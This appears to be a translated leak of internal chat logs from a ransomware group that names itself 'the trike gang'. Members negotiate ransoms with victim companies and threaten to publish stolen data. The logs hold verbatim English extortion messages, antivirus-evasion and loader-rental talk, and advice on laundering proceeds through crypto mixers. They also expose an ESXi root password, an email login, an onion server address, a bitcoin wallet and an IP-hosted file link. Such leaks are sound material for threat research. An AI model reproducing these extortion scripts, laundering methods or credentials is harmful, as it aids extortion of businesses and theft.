you can only host the html feed, right?
The whole system consists of 3 parts - html file and two more files (appxbundle and appinstaller)
When we were casting, we kept all 3 of them on one host and used them that way.
I could give you all 3 parts as well as the 2 files (appbundle and appinstaller) hosted on an azure host (like we did) and you get the html file
It is not so important for the test now, I can give you the html file too.

I can host everything.

When you show up, please let me know. We need to think about what to do with HDP. They insist on handing over their data. I understand that these fuckers probably deleted the encrypted files and left with nothing. So they need to upload their data somewhere, give them the codes and go fuck themselves.

Do you know if the bug is fixed?
Hi. tell me the bug is not fixed yet?
you knocked the can off really fast.
I was leaving room for maneuvering
To get it down to 4.
5200-5-4600-4300-4
now it's 4,500 and I don't know.
and they only got 1750.
Fuck, that's a pretty steep drop in the can.
I was leaving room for maneuver
to get it down to 4.
5200-5-4600-4300-4
Now it's 4,500 and I don't know.
and they only have 1750
[12:05:35] <skippy> fuck, that's a pretty steep drop in the can
[12:05:44] <skippy> I was leaving room for maneuver
[12:05:49] <skippy> to get it down to 4
[12:06:01] <skippy> 5200-5600-4300-4
[12:06:11] <skippy> now it's 4500 and dz
[12:06:20] <skippy> and they only have 1750
well, i thought up to 4 at most
then all
50% and cross
i.e. from the bank we have to get 4k
I don't think we can get more than that
Oh, yeah?
and now they'll give us 2.
поэтому сле.4400-4300-4200-4000)))
that's how it is

Mm-hmm.)
Comic books have been paid for
I don't want to drag this out
Yeah. .
I got paid last night at 2:00 a.m.
No, the bank is such that they're just stalling.
It was a good day yesterday.
No
See
the bank.
Here's what I'm suggesting.
I made a deal with the Germans just like that.
4k - 50% and that's it guys, we close the bidding.
next thing you know, we're putting the data out there.
and that's it.
You could do that.
But it's after the weekend anyway.
Otherwise it'll be until the second coming.
Yeah, not...
It's usually a week.
They have one more day today.
They can't do it in a day.
So we'll have to wait till Christmas.
And we still got 250,000 bucks to go. Those motherfuckers.
They're not talking .
I don't think they will.
I also got the fuck out of here yesterday.
We have a BAG in the panel.
and those companies that don't write us, they just can't write, there's a bug in the panel
that's how the fuck it turned out
fuck
today the programmer has to fucking fix it
yeah
if they don't translate I'm telling you
and i already fucking posted 40% of it.
Yesterday I hid everything.
counting you gave us 750k
Yeah.
We need to give them a hard time
that if they don't pay out 250k today for example
tomorrow the data will be online and thank you for your gift))
They have time.
until Friday.
And that information is there.
It's the last day the banks are open.
That's their problem
and from Thu to Mon they have days off
))
well, yeah
Shake the decider, let him pay your salary.
It's so decent there.
and you'll get even better.)
he sent me 19 yesterday
for two Target.
That's cool.
I'm expecting 16 today.)
and today's about the same.
yeah
Yeah, and I got 20 for three.
guuuut!)
What do you think, a million and a half of wood?
yes, i'll close the loans before the new year and go into the holidays as a human being without debts)
12k paid off, another 12k in December, and that's it.)
And started saving for a square.
You're good.)
already made a preliminary deal on the purchase of land
I will finish it next week) and the beginning is done
can put a tent and live already)

no one's gonna kick the bitch out
yeah yeah!)
the next thing i'm gonna build is a bathhouse
with a guest room to sleep in
and then I'll get to work on the house.)
man, this is a hell of a plan!))
need at least 3 bits for everything

yeah, same thing
you haven't saved up yet?
2/3 of the house is supposed to be like this
saved up
finished it yesterday.
construction?
not
the piggy bank
)
the right amount to take to the leger)
yeah)
so yeah, the bitcoin is down right now
not profitable to withdraw it
I think it will bounce by New Year
and then it will be possible
I'll take it right away.
to usdt
leger to usdt?
Yeah. .
Of course
It does, yeah.
Can you get the bit on leger?
it's just an ether token
usdt
Btz yes.
I accept leger.
I'd like to transfer what I've saved up to leger into btz.
and then when it's higher, I can transfer it to usdt
Is that okay?
Sure. .
i.e. i assume i select which crypto to support via app, right?
yes
and i set up a wallet on it.
you choose a few.
yeah
well, i'll just choose btz and usdt.
all
and I'll send each other.)
I've got usdtz and ether.

It can't.
Aether is for commissions.
It's not a fucking exchange.
on usdt.
It can
There's an exchange.
I mean, you have to put ether
and tre20 to use
but in any case - from btz to monero must first
I've got the bit already clean.
only ers20
on the Ledger will be
Ledger's.
okay
well that's a bad thing they did, the exchange is much better in this case
I don't trust the exchange as a wallet.
for storage.
I agree
where is the exchange built in? in the app?
Yeah
But I don't use it.
I mean, I can transfer from the app to usdt directly.
But how do I get the air?
Probably .
♪ the exchanger ♪
Btz air.
Not like that. It doesn't automatically transfer from Btu to usdt.
you need to have money on the air, right?
You need the money on the air to send usdt.
It takes a commission from the airwaves.
That's it, it's clear now. It's all tied to the ether.
just like blockchain.
of course
a token is a token
I see. Yeah, it's at least $25 for each tranche.
and you can wait for who knows how long, you can wait 24 fucking hours.
I mean, you don't know how long.
2-3 minutes.
That's the longest it's ever been.
2-3 minutes.
I mean, I don't know how long.
never more than that.
I'm having trouble with the AV detects again. generic is clean and rundll32 is dirty.
So far to build only generic?

hmm
answer?
What about the ones in the tree?
the ones you didn't find?
Two yes.
no
They are not.
There aren't even any folders.
I looked up the tree.
Ah, so they're yanking randomly again.
Yeah. .
bitches
Same answer.
They took a look at the tree.
and gave a couple of files from it and the rest that aren't there
Not random.
I think they're real.
They just weren't downloaded.
They didn't leak them all.
So they're trying to figure out what we have
and how relevant.
Yeah, I get it.
Well, that's great, if it's fixed.
Then today there will be those who couldn't get through

Good point.

Hi
I'm the admin.
what's your problem ?

[15:23:28] <defender> on the second one I made a lot of edits and started it already
[15:23:35] <Stern> already working?
[15:23:36] <defender> he should double-check

[15:23:50] <defender> well i used to load it from trike, it worked
[15:23:56] <defender> not 100% of course it knocked

They seem to be rare motherfuckers, they deleted all the encryption files)
now they're asking for credentials and access to their data
this needs to be done by everyone or else the toad will stop working for you

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know if it's OK.

Trump, you're confusing something: qAmF6OnohObDVKqjIQ2QWPOCBsiCHCIUYdbMZW6qHKcbv4ZSqwctvrpxNlGhtu9M - I don't see that anywhere, not in the first panel or the second.

What's up with the silence so far?
I sat for half a day yesterday.
replied

It's quiet.
and made blogs on the newbies
When you reply, please pay more attention
There's a lot of typos and grammar.
it's important for us to be impeccable
in detail
Yeah. .
then
it's the little things.
You messed up there.
where?)
when the file tree offered
for future reference
Before you suggest it, ask.
and look at the amount of data
to whom
BSCR
I had to make up shit not to send it to you.
there's almost no data, and the ones that are there are all old))
2016-2018.
fuck)
i couldn't even blog on them
it's all fucking bullshit.
so keep in mind here
there's even a phrase about file three
fuck
and the mistakes and stuff, that's bullshit.
well you have to avoid it somehow
otherwise it's a fiasco.
if they realize that we don't have any fucking data))
:-D
and the faggots who paid part of it, the floyd, are in no hurry to pay the rest of it
I gave them till tonight.
so I'll put it out tonight
and fuck it
I'll fuckin' post it tonight if they don't pay the rest

Right
[ERROR: This message is encrypted, and you are unable to decrypt it.]
And the fucking panel
it replaces the characters itself with some bullshit.
finally the password was discarded and the panel replaced it)
it's fucked up.
and i also have a suspicion that not everyone can still write in the chat room
I do not know how to check it
but I have a deep conviction, otherwise where is DOMKIS?
they asked for the decrypt
and disappeared after changing the panel
as well ACNE
something strange.
it replaces the sign '
acne tested
and not only
look at the password)
copy and paste
you'll end up with a completely different one.
although there's no apostrophe there

Yep.
I don't care if it's a prft.
I still don't know what it's replacing.
yes, it's better to send passwords and other stuff via prvnote
+++
Copy that.
the main thing today is not to fuck up the bank
we need to get them up to 4k
what do they got
а
Yeah.)
There you go.
the rest are kind of petty, but I also think this week we'll choke
http://198.244.193.210/images/wolf.png
rob141 exe
where did you say I have a bad writing?
it seems everywhere normal
OK, We give you 3 days, after 3 days we wait the payment and no more time requests from you.
OK, we give you 3 days more to make a payment. No more additional time requests.

Sorry, but we cannot give you the files list, because remote server breaks connection all the time. But we have your data from bscrna1-fs1 and WILKERSON-NUC servers, so you can evaluate your data.

Thanks for the backup.
I see the bank responded, man.
while I was gone.
That's okay.
I should have given them more time.)
It's okay.)
I'll get the files.
they're already fucked with time)
nlbuse
ok
Already found it.
The bank doesn't give a fuck about time.
They're working.
Nah, they're in a hurry.
They restored everything.
those guys are pros.
They don't need a decryptor.
They restored it, they restored it.
but they don't want to spill their date
they want to get the fuck away from us))

yeah
well yeah
that's what's holding them back)) otherwise they'd tell us to fuck off

honestly i don't think we can take 4
i don't think we're gonna get 4.
3 to 3.3 would be good.
I hope so.
Okay. .
If tramp is in, it means we won't go below 3k
Sure. .
ok, but i'd keep them busy, there's not much left before christmas))
yeah, we need to get a good score by january
I'm still on vacation at the beginning of January.
I think we're all on vacation
till mid-January.
Mm-hmm.)
What, are you flying somewhere?
No, bro.
I can't afford to go yet.
I want to buy a quad.
but I haven't made any money for it yet.
That's true, too.)
but not for another month)
just today made a gift to myself
finally bought a laptop
handsome)
yes, happy))
you can score a square in a month
here
I just bought an iphone at home, too.
I've wanted one my whole life.)
Yeah, you can, but I would if I had 1%.
I'm not quite there yet.
I'll get it.)
i also got an american)
razer
nice beeches
yeah
I love it.
I could only dream about that before

same thing
With the SIM card?
I have 4G.
no, I mean in the laptop sim card is inserted?
Or only through a whistle?
No
I don't think so.
I don't see it.
I'm looking for another one of these.
only through a whistle like that.
hp is getting tired of
so why would you
it's better via whistle.
for work.
then threw it away and bought a new one.
whistle in the bag does not fit)
than you can light your laptop
plugged in
I'm changing the notebooks anyway.
I have the same mac address available to the whistle.
fit, if the bag on more))
[Error: the message is encrypted and can not be decrypted.]
[Error: message encrypted and can't be decrypted.]
Well, .
I have a favorite.
♪ leather one ♪
my wife gave it to me.
ahahah notebooks for her size)
[Error: message encrypted and cannot be decrypted.]
[Error: Message encrypted and cannot be decrypted.]
Well, you can afford to switch laptops all the time now.
and you can change the mac address, just so you know.)
Yeah, I know.)
I just don't know how.
I'll teach you if you want)
It's a piece of cake.)
Yeah, that'd be good.)
there's a program that does everything automatically.)
linux?
there's one for linux and vinux
but on macs don't know)
cool
because I never had any.
i don't use mac for work
never
it's purely a home station
well yeah)
what inch screen?
27
27
Or bigger?
yeah
I don't think the imacs are bigger.
the new ones are 24.
I don't know anything here)
Well either the screen buy them separately, but I don't need one.
Yeah, of course.
I'm not a designer or a renderer)
So, tramp said yes.
need to finish with the bank
++
Otherwise we'll overcompensate and they won't fucking pay at all.

hi
same problem again
no our softwares
????
we need a decrypt from them, but it's difficult for fluit, they can't decrypt linux files
so they will never pay us the rest.
empty messages are coming in
hi
yeah i read the chats
it's not going well with these guys lately
before everything was fine
it's just that when you sit tight every day and people fuck up, it's not a good thing
it's after the fuck up that it started
man, do you have a way to get a decryptor from them?
if it was that easy i'd be decrypting it myself
that's their bread and butter.
okay.
we'll just have to wait.
Unfortunately, there's nothing else to do.
Over the New Year holidays I will write my own encryption software and in a month we will start working on our own software
we need to close these issues faster
and we'll have our own panel and all our own stuff
i fuckin' hate it when it's freezing!
well great, maybe you'll give me a 1% raise there)
I agree with you about the cold.
it's not a job.
i suggest we don't fuck with the bank anymore, now they'll make an offer and we'll settle for what we've got
Yeah, I'll raise it.
let them pay out.
on the HKI.
Did you see that?
you already get 1% with my bonuses
didn't you?
how much they offered?
then i will cancel all bonuses at once)
yeah! with your bonuses, bro.
thank you for that.
i say we don't fuck with the bank anymore, now they'll make an offer and go with what they have
 That's right, or they're gonna bail.
I gotta warn Skippy.
Your one percent comes out that way.
or he'll overbid them.
You're making as much as Skippy, don't worry.
Yeah, I guess so, bro.
I mean, I get it.
I didn't think so.
I wish you'd get your panel done so we can do the carpentry work ourselves.
We've already started.
we'll write day and night
It's gonna be okay.
I'm not sorry bro, thank you for getting me out of the swamp, at least I can breathe
It's just the software itself that's important
It's the encryption that's important.
It's gonna be a lot of trouble.
We'll get through this
but it's doable
yeah there's still a lot of work to be done
I can test your software
if necessary
If we make the software even faster, we'll go by ourselves.
Yesterday I made a present for myself
bought myself a laptop
so now I can put the virtual machines to good use
Hbs
congratulations
well done!
Thank you. You're sorry.)
Well, it was a once in a lifetime gift.)

You've got to put the money through the mixer.
and then output it.
You'll be more careful.
Yeah, I skip everything.
The most dangerous thing in this business is this money.
No exceptions.
The main thing is not to be fucked over by the mixer.
That's what I'm afraid of.
the only thing they'll be looking for is the withdrawal of the money.
the main thing is not to fuck with the mixer
 The mixer also pours all kinds of bullshit

It's a mess...
No kidding.
it will be a big trouble if these two softwackers don't show up.... with decrypt then we'll be screwed

[19:13:47] <22> will i give out 10 docks ? this and that. i gave it to him, he checked. he says make copies. i make copies while i fill it he says there will be other links
[19:14:02] <veron> yeah right, I was talking about it
[19:14:08] <22> 1 doc with 5 links and 200-500 copies
[19:14:37] <veron> with one stub 3 docs on different links



[19:14:54] <veron> I'm not going to argue now, I'll bring up the story to discuss
[19:15:46] <veron> [15.11.2021 15:26:46] <veron> team of three people, so I said that it would be necessary to do three different files [15.11.2021 15:26:59] <veron> each will knock on your door and say what you need, okay ? [15.11.2021 15:27:07] <veron> me in charge )
[19:16:00] <veron> [15.11.2021 15:27:20] <22> ok [15.11.2021 15:29:03] <veron> tomorrow by 10.00 can you give out? [15.11.2021 15:29:35] <22> yes. just send me the templates [15.11.2021 15:29:41] <22> just a doc with pictures
[19:16:32] <veron> anyway don't tell me I didn't say))
[19:17:09] <22> well i was inadequate for it. it's cheap. well i gave out two docks last week and today i gave out and will give out more what he asked. and also wednesday and thursday.
[19:17:13] <22> okay.
[19:17:33] <veron> it was not for work
[19:17:40] <veron> you didn't even showed me ready solution.)
[19:17:51] <veron> we were supposed to check everything
[19:18:05] <veron> we didn't even spam
[19:18:07] <22> I was wasting my time. There was no specific TOR.
[19:18:21] <veron> now I'll bring up the story )))
[19:19:18] <22> now it's satisfactory asks docs for other links. even two docs. you want to see my story ?) 10 pages long. wrong picture or something else)
[19:19:23] <22> wrong weight
[19:19:35] <veron> what did you think )
[19:19:39] <22> and every edit goes to the whole doc
[19:19:43] <veron> 5k more )
[19:19:56] <veron> in general you want to work?
[19:19:58] <22> it's normal . I'll work one week and that's it.
[19:20:13] <22> that is 2 days
[19:20:18] <22> Wed-Thursday
[19:20:21] <22> and today
[19:20:23] <veron> if yes, we agree with each other, if not, sorry


1,5 k work it all out
[19:20:46] <veron> that's not good
[19:21:14] <veron> we didn't spam
[19:21:14] <veron> we tested your solution under us
[19:21:15] <veron> you were making changes
[19:21:32] <veron> work it out for us


and no more questions
[19:21:53] <veron> i.e. as we agreed to do every day to each dock, burned or blocked links change
[19:22:03] <veron> during the day
[19:22:13] <veron> 5 days - and gone
[19:22:33] <veron> otherwise in the group where you are, you will be removed and you won't work with anybody else there
[19:23:17] <veron> waiting for decision, 1,5 refund

ok 200 bucks for the tests
[19:23:21] <veron> 1,3k back
[19:23:26] <veron> we'll find others
[19:24:59] <veron> actually give it back, I don't want to work with such attitude, I don't like to work with such people if you're like that from the beginning
[19:25:03] <22> yeah what group
[19:25:19] <veron> it doesn't matter, will you return the money ?
[19:25:27] <veron> 1,3 k


200 for the tests.
[19:25:29] <22> yeah ok I'll write to stern to judge I have no money

skippy, buddy, where are you?
skippy, don't write anything on the can, even if you have to answer it. It's important!!!
hey, .
here?
ghbdtn)
hi
wow
why
So look, according to the bank - as soon as they give us an answer with payment - we agree
and why did you agree to 1150?
Got it. .
Because they don't have a date at all.
8GB.
We won't get anything out of them
We should have at least 1300)
There's a high risk of overkill on the bank.
That's why we agree on their price
The bank, that is they give us 2200 for example
and that's it
We're so okay.
Right,
?
It's like this: Ok, we are agree. $2,300,000.  The BTC-wallet for payment:
We are waiting the payment today.
2,200.
That's the price they're charging.
Their price.
Got it
Yeah. .
There's .
And the issue with them is closed.
Something's come off.
We need to maximize the closure with all of them.
There's no point in bullshit.
Yeah, of course.
It's already been resolved with Trump.
january soon)

Yeah.)
What's your answer?
I don't know yet, I'm thinking.
but I'm not sure 110k is good enough.
Yeah, I don't know either.
but basically we only have a decryptor.
Yeah, there's no data at all, I couldn't even do a blog.
Fuck.)
there's nothing but crap from 2016-18.
I mean, it's garbage.
bad
that's why it's dangerous to lead to the data
+++
that's why we need to be careful somehow
another thing - they wrote that they can restore most of the data themselves
uh-huh
you can play the idiot, of course

It's like 110k isn't enough

Well, yeah.
No, not saying anything
like our decryptor is worth at least 700k
just give me an amount.
No.
and plus a guarantee of 200k that we'll kill everything.
just say that the decryptor costs more, even just the development
i.e. just 110k is not enough give more?
like 100k isn't enough?
even just a pentest for a company their size costs more
not to mention the work and guarantees
but we're understanding
That's why here's a discount
That'll be eight dollars.
Yeah, the sooner we get through with them the better.
It's good if we can get 500k.)
++
I think so too.
I think 400 to be honest.
Whatever.

Guys, you evaluate the our team very low, $100,000 for us is not money. Just development of our decryption tools (for Windows and Linux OS) cost more than $500,000. Our guarantee of wiping data has its own price. We give you some discount and our price for you will be $800,000.

Sirs, it seems like you are evaluating our work too low. Even a simple pentest for a company like yours will cost more than you offer. Multi-platform decryptor development, work of a lot of people... Plus our guarantees are not free, as you understand.

However, we understand your harsh situation. You checked an info about our organization and it looks like a positive trait. So, we are ready to make you a discount: from now, your price is 800,000 USD.
vot tak
Go ahead.
I'm just confused.
one thing
pentest no one asked to do)))
that's why I didn't want to write anything about the pentest
so you did)
ahah
well the answer is asked, we did not ask to pentest, why should we pay for it)
that's my point
come on who cares?
We didn't ask for it.
it's already done
and like they'll get the report
after they pay for it.
they don't get a fucking report except for the decryptor.
well we'll give them the report)

like we're spam.
we'll see what they say

Take the builds from the paranoid.
You were a little too hasty with the bank.
You should have said 2800.
i had to say 2800 and it was too early to say 2800. well we decided from the beginning we would accept their next offer. and i think they were right, because they were already losing interest, there might not have been a next offer.
tramp, better a bird in the hand than a crane in the sky)
300k will not play a significant role here, but it's a fact! Remember how you were nervous and wrote where the fuck the bank is)
i knew i could get them again, but this is the last one!
ok, polemics, you have to remember that greed will kill you.
just trust my experience.

Not yet.

750k - that's already been distributed and you got paid for it.

but the files there definitely need to be updated
I'm thinking of upgrading everything to make it cleaner for the AV)

trampich, HOULEELEC asks about the price
what shall we give them?
if i am not mistaken you gave them somewhere around 7 or 8 million

Do you remember how much they charged Huulecu
I wanted to tell them it's time to pour the fluid.
but no, they paid for it.

no
they paid.

 do you remember how much they charged Huulecu?
they need a price urgently
[16:23:15] <fire> hululu do not remember
if memory serves me right it was 7 or 8 million
minus 20%
let's screw them 5.5k with all discounts
what do you think?
did you look at their turnover?
Like 274 million.
Hmm. .
Well, you know that's not a realistic amount of money.
Well, it's okay.
Okay. .
What do we write?
So-and-so.
5.5.
Yeah. .
Okay. .
I'll check it out.
Then with all the discounts, it's 5.5k.

Let me see what they had.
274 million.

If they pay at least $3,000,000 it'll be fine.

Well we will wait )
I think they already have a definite solution
the new panel will start knocking now guys
i remember exactly what was 8 million
They already put four nets on the new panel.
cool
Six more nets in the works.
We've got to get them done before Christmas.
10 or more nets a week.
10+
Holy shit!

well done
Let's make the most of it.
yeah
I take it we're going on vacation.
or how do we do it as a team?
hihi
Yes, we will have a couple of weeks off for sure.
We'll see how the guys feel about the state of the team.
ok
Last years we had a month off.
New Year's Eve.
Yeah, not bad.
we were off from december 25 - 28 all put out, i stayed in touch because i did the targeting myself
and in February, we'd launch at the beginning of the month.
That's the plan for this year as well.
I'm gonna help you out.
Next year.
now 10+ a week and everything will be as good as last year
Well, I'm not taking any time off anyway.
Yeah, of course.
Maybe next year will be lucky.
I don't know what the other teams are doing and going off
They're only losing $
Well it seems that the team leaders are getting cold feet.
it's a good thing we have less competition
Or they know more than we do
i still do not understand how they figured out the IP address of the server where the previous panel was
it means that in the nodes of the torus there are their own servers
and somehow we got into them
could have gotten into a bad node
I raise specially such nodes
it may be the same here
yep
it's all bullshit
the main thing is the guys got it up and we didn't fuck up the targets

they're fucking principled

you can change it for sure, it's working and up to date.

Ok. No problem. Without full file tree

say full file tree you only get after payment if you refuse 30%

You think that's the way to play it.
well yes
yes, under the system
or let's shit the date.
what else?
skippy where
the bot cooled off?
what language the system's in, that's what the installer's in.
yeah, i knocked it off.
you deleted yourself?
i don't know about you. i wasn't looking.)

Okay. .
I first ran with this vm - there was this ip
now ran (but the ip is already 86.105.9.13) and he knocked on the bot

Don't you get it?

Yeah, I got it.
You need to hold your ground.
It's okay.

Hi, I need to fix your solution
hi
on the bank:
New login and password from ESXi:
root
%*U&#38;bs_r1
look closely at the password, i'm sure it's wrong because of this fuckin' &#38;
if you can send it to them in the prvnit, and the mash logs left to throw them. And then you can ban the bank, so as not to interfere in the panel.
Yes, and just in case prepare a wallet for BSCR
for the bank:
New login and password from ESXi:
root
%*U&#38;bs_r1
hello
take a good look at the password, i'm sure it's wrong because of this fuckin' &#38
and just in case, have your wallet ready for BSCR
If you can forward them in the prvnote, well, and logs mash left to throw them. And then you can bank so as not to interfere in the panel.
good morning

Hi, need to correct the pliz solution

my internet is down( ok
hello
this needs to be done by all of you or else toad will stop working for you

toad's new domain version 3
odw5mdwotufuxxrgw3pvqjjuze3e33e33bylylkl667h4nefwiimwqsumyd.onion

it is written in the account settings - connection - server
Before that, on this tab, tick the checkbox Manually specify the server address and port

standard port 5222

IMPORTANT, everything else remains, the account is left with the old domain... Only the domain for the connection is prescribed

!!! When you do, let me know if it's OK.
It's done. It's connected.
SRY already offered 400k))
it's just kikes) you have to spin it

are you testing?

hello
hello
who are you? why did you add yourself?
I don't know, it's kind of a work thing. I was added to do xls.
Oh. Okay.
Hi.
here?
Doc, you want to test it?
I take it we need to discuss this with you?
Yeah, you can talk to me.
What were the terms of the deal with Ford again?
i need you to get a dock for one of our adversaries on a subscription basis, but i need it to always be on a regular schedule
Usually monday to monday morning.
10:11 a.m. Moscow time.
Well look generally I do 400 per build, but with your saport agreed that on a regular basis will be for 300
Yeah, I'm willing to work that way without a hitch.
super great
Veron@ add it.
for him to do
I can't get him to pay for it.
he's got a looder out there that's not too fancy on crypto
emoteed if you heard)
You'll agree with him on what date you'll start.
and to me about the payment

i'm the local sheriff :)
I got it )
Did Ford tell you who we are and so on?
no
and if it's not important to me, i figured you're a grid operator

the trike gang we are

etc.)
Yeah )
so I heard.
well
Our software isn't too complicated, there's no particular nuances
if only by the entry points on the dll
but we usually tell you if there are peculiarities
are you only building docks or what else do you do?
Yeah, I can do vbs and js too.

are you any good at js?
i really need a good js coder)
Not really, I just have my own coder to help me out when I need it.
Got it
Ask him if he'd be willing to do a gs looder for us.
and how much it would cost
I've got one.)
you just a dropper?
or just a lowader?
have a clip?
yes i do, i have a looder but the executable itself can be vbs js xls and doc and hta
What's the anchor? Your own looder?
It's a resident bot, so it won't disappear after you restart your PC
 Resident of course.
great
Do you download it yourself?
does anyone else work on it?
i'm the only one who does google traffic on it now
dino@ will dock it for you when you're ready to test it
The dock is fine, I've never seen a better one.
Copy that. .
I added your guy, but he's probably not online right now.
I have a team that needs a fix for one of my teams.
Isn't there any way to arrange a job/rental?
He doesn't answer often, he's busy.
On Mon-Fri most likely.
.
He said we're starting today.
Oh.
great)
we've been waiting for him for a month now...
I'll give another guy - test the loafer with him, if he is satisfied then we can work on this topic too
Hi
Ok, now I'll do what to pay you once a month payment or what?
You'll get a message from me
with a Lowder
Anything you want, hta ws vbs
Test it please let me know if you like it
dylon@
oh, shit!
dylon@
it's for the loafer.
Pay as you go.
Usually everyone gets paid twice a month on the 1st and 15th
but we can do it any way you want, just once a day.
I'm just not always available, if anything will have to wait
during the day there +-
dino@
add it
Do you want payment now or when? He just said to get the dock ready for him.
Just for the test, I already did it for you.
Are you still here?
if i do your grids what percentage can i get?
I'm here.
Sorry I got distracted.
I'll pay for it right now. Leave it to me.
He didn't test it, my testers and Ford did.
[Error: Message encrypted and can't be decoded.]
I'll pay for the inconvenience just to make him happy :)
for nets usually 25 for nets with hell and 15 for nets without hell, as long as we do everything
date, lock, negotiation, osint etc etc
[ERROR: This message is encrypted, and you are unable to decrypt it.]
But if you're with us for a long time, we'll give you a percentage.
[ERROR: This message is encrypted, and you are unable to decrypt it.]
30 and 20 can be done, but not immediately, at least there the first 3 payments need to get
when you lock, we give you ID and access to the chat on your user, you can watch the dialogs, whether or not the grid is online
but you do not have to write anything, there are trained people sitting there, they know what they are doing
i can just rent a locker if you have your own hackers
[ERROR: This message is encrypted, and you are unable to decrypt it.]
[ERROR: This message is encrypted and you are unable to decrypt it.]
not me it is easier to work with you I just if there will be grids will give
bc1qdvmlyvaq46e53r8y6e4cyj4pq8cdf8fukj82x0
Yeah ok, either text me or I'll give them the teamlid of some hackers - they can directly
dillon can by the way
ocean
he's a good guy to start with
and there if you need more people, we have a lot of hands
ok
purse thrown
a couple of minutes
I put in 2k, let's see how it goes and then we'll figure it out.

HOULEELEC
yes
What did he send?
now
hi
hi)
you're fucked up all right.
not .
was yesterday
I told you.
I was this morning.
all right.
Conti team - we have 2 cases with you that client paid and you did not deliver. Who to speak to, email, telegram, tox, irc whatever works because clients are beginning to believe you do not deliver. Can you reach out to me miroslavpopov1980@outlook.com

or this is not good and we have to tell clients you are not trustworthy and we prefer not to do that.
tramp@q3mcco35auwcstmt.onion
that's the text they wrote in the prvnt.
I need these woofers.
I can't really understand
What clients is he talking about?
Who did we not give what to? but took the money?
Is this about us?
Are you busy now?
Well, you need to write to them at the post, but I do not really understand why and what to write.
I don't know, I'm curious myself.
Looks like somebody got screwed by Sonti.
Let's write. Yeah.
A couple of companies.
from their words.
Make a post office for them.
2 cases
okay
Let's find out who they're talking about and what they did to the conti
I'll create an e-mail.
Okay. .
Let's get access to it later.
and we'll text them.
Okay.
then when these guys get here we'll talk to them
+
 this is the negotiator who negotiates from several companies
he knows something
We need to get some information out of him.
We'll find out. Okay.
It's not good that someone does that.
Yeah. Exactly.
It'll be very difficult if we lose our trust.
It's a reputation.
Of course
and now it has not yet affected the result of this particular ratchet, but maybe it's just a delay in solving the issue
let's find out
fillemand@protonmail.com : sgffj*&^#Jji%#^&$
text them right away.
then i'll just write that we're a team and you asked us to contact you by email.
yes
ask who they're talking about?
and add which two cases they are talking about let them explain in more detail and say we're willing to help
Okay
I write to this box? miroslavpopov1980@outlook.com
Yeah. Yeah.
by the way, they squeezed more or less out of BSCR
da
everyone needs to be squeezed like that
skippy said it wouldn't make it 300k
))
well it worked!)
Well, Mater's got to write!
Let him write and it's still up to me to decide
Well, I was the one who wrote it.
I'm the one who's got to push everybody and they're all fucked up.
I know how they stick to it.
yeah yeah you wrote I see
)) We'll get 'em all.
the main thing is to keep them in contact
there's a new tagger in the chat room and they don't post
this is weird
bro, you know better than that
there are a lot of places where backup storages were unavailable and they were breaking them all over
Why is it not written?
so i can install the system
well that would explain why
yeah
Trying to rebuild from backup.
but there are those on their knees
They haven't written yet.
Well, let's wait.
analyzing
Patience, bro.
We'll put two more today and then we'll rest until Mon.
That's for this week.
cool.
will be online soon
but there's not a lot of contact

Who are the blogs for?
when they come out you will do ъ
ok
Well, we should do them all.
Then I'll make some blanks.
If we publish something, they will know where to write anyway
large there are networks here?
INT-MYCHOICE
462M
SOLERPALAU
DTSEE
they are under special control
Oh, man.
did you see the bit fall
asshole
TECHNORD is still good
I was just about to save up for a quad.
and then fuck it, it just dropped like that.
you emailed me?
yes
crypto
that's fine.
take your time.
It'll grow back.
You know what confuses me?
Why is this box with a russian first and last name?
miroslavpopov1980@outlook.com
Doesn't that freak you out???
No, as a reverser.
You can only go through the torus on the proton.
Yeah, sure.
I mean, he's been sitting around trying to come up with an email.
Thinking about what to call it when I'm communicating with the russians !)
Google Russian names and come up with one.
maybe it's the russian negotiator
who works there
he went to a foreign country and found himself in the field of negotiation
they are not stupid there either.
Have you been to Yusa yourself?
nerve
No. .
i've never been.
Have you?
Well, it's okay.
I only studied in England.
Don't be embarrassed.

Have you been? - No, and I'm not going to. I watch movies.)
I would destroy all those Anglo-Saxons and Austro-Hungarians long time ago)
Why not?)
I can't stand them because
there's a lot of geezers in our country
they are what they did to you )
Churks are different
That's some fucked up shit.
History friend, history
They didn't do anything to me personally)
russia is a third world country because of this shit.
i see on the net.... you beat 3 germans
yeah
tough
there will be trouble again)
they are all greedy bitches
i was in germany
i hope they don't get any more abuses
(i was in germany))
how is it?
ok
i was collecting bottles
to get by
we all did it when we were kids
a lot of experience)
I'm not a kid, bro.
all these nets are gonna be knocking in the new panel?
I see, so you've found the right job for you now.
we're all simple guys from very simple families who lived poorly.
That's right!!! The main thing is that your team does not fall apart and stop working
Everything that's happened to you has happened to us.
That's why I understand you.
We will only fall apart when I say STOP! =))
When are you going to say it?
hopefully not soon?
i know it's not forever.
we'll leave together.
as long as there's no ruckus about the job, we're working.
As soon as they start fixing it, we'll fold.
Okay. .
I get it.
Well, then you'll get back together anyway.
♪ as soon as it calms down ♪
Let's see
But it's a long story.
It's gonna be around for a few years.
Those who founded it, they're long gone.

Yeah.
I can imagine
But leaving people behind isn't good either.
Before covid, it was many times higher.
Yeah. .
I can't stand cheaters.
Well, it happens.
They're the founders.
They left beautifully.
they could take what they had because they helped many people to work and showed them everything
I have not heard much about them, I generally in life - I do not like liars and cheats
I do not condemn them took it
left but they left the topic and we are now feeding off of it
Mm-hmm.
I made more money with you in a month than in 10 years
Yeah, right.
I may have exaggerated
That's normal.
In five years for sure.
++
you buy an apartment.
you can go ahead and take out a mortgage.
for 120-140 square meters.
Don't take it for cash, take it through a bank.
Not yet, I can't do that much.
yeah
I'll do it through the bank.
Otherwise the tax office will get my ass
I still need to find it and so on.
Yeah, .
I had 24k in debt, I almost paid it off, but the bit fell off at the wrong time
just not at the right time
Wait a minute.
I've got 80k in my account so far.
When it's back on track it'll be even better
At least another 40k and you can buy a square
I have different numbers on my screen and I'm not that worried.
well, yes
the higher the amount, the greater the loss
Exactly like the gain
Well, you probably already have everything
purely a hobby left
and I'm still driving a 2011 polo)))
probably
I'll get my quads done and then I'll change the car
for a new one, like most people)
Okay, the nlbusa's a dickhead.
I'll start unloading them to the max.

Hi, write please, how are we doing today ?

hi
just got online
